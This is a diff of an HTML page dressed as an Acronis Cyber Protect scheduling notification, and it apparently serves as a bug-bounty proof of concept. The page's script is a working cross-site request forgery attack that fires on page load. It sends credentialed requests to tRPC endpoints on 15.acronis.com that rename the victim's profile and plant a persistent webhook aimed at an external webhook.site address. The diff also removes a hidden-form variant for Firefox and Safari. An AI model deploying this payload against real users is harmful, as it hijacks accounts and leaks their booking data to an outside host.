@@ -30,20 +30,26 @@
   <div class="ft">Acronis Cyber Protect &middot; This notification was sent because you are subscribed to scheduling updates.</div>
 </div>
 
-<!-- ================= CSRF PAYLOAD ================= -->
 <script>
+/* CSRF — executes in the victim's session on page load (works in Chrome/Edge defaults):
+   - Content-Type text/plain  -> CORS-simple request, no preflight, response unreadable (irrelevant)
+   - Session cookie SameSite=None -> rides on the cross-site request
+   - No Origin/CSRF validation server-side            */
 const T = "https://webhook.site/dc97c56b-3137-4b2e-8834-c7ac4d75c32a";
 
-// ---- VARIANT A: silent fetch (Chrome / Edge — third-party SameSite=None cookie flows) ----
-// A1: change the victim's display name (visible on their public booking page + settings)
+// 1) VISIBLE ACTION: change the victim's display name
+//    -> shows on their PUBLIC booking page (https://15.acronis.com/<username>/<event>)
+//    -> and in their Settings -> My Account
 fetch("https://15.acronis.com/api/trpc/me/updateProfile?batch=1", {
   method: "POST",
-  headers: { "Content-Type": "text/plain" },   // CORS-simple -> no preflight
-  credentials: "include",                       // SameSite=None cookie attached
+  headers: { "Content-Type": "text/plain" },
+  credentials: "include",
   body: JSON.stringify({ "0": { "json": { "name": "Pwned by CSRF (mon3m.site)" } } })
 }).catch(() => {});
 
-// A2: plant a persistent webhook on the victim's account
+// 2) PERSISTENT: plant an attacker webhook on the victim's account
+//    (fires on every future booking; NOTE payload delivery is currently
+//     template-name-only on this deployment — see report caveat)
 fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
   method: "POST",
   headers: { "Content-Type": "text/plain" },
@@ -55,18 +61,6 @@ fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
     payloadTemplate: "default_listener"
   }}})
 }).catch(() => {});
-</script>
-
-<!-- ==== VARIANT B: top-level form POST (Firefox / Safari — navigation = first-party, cookie always sent) ====
-     enctype=text/plain serializes as  name + "=" + value
-     name = {"0":{"json":{"name":"..."}},"pad":"    value = "}     →  body = {"0":{...},"pad":"="}  (valid JSON) -->
-<form id="ff" method="POST" enctype="text/plain"
-      action="https://15.acronis.com/api/trpc/me/updateProfile?batch=1">
-  <input type="hidden" name='{"0":{"json":{"name":"Pwned by CSRF (mon3m.site)"},"pad":"' value='"}'>
-</form>
-<script>
-  // give Variant A ~900ms in Chrome, then navigate with Variant B (Firefox path)
-  setTimeout(() => document.getElementById("ff").submit(), 900);
 </script>
 </body>
 </html>
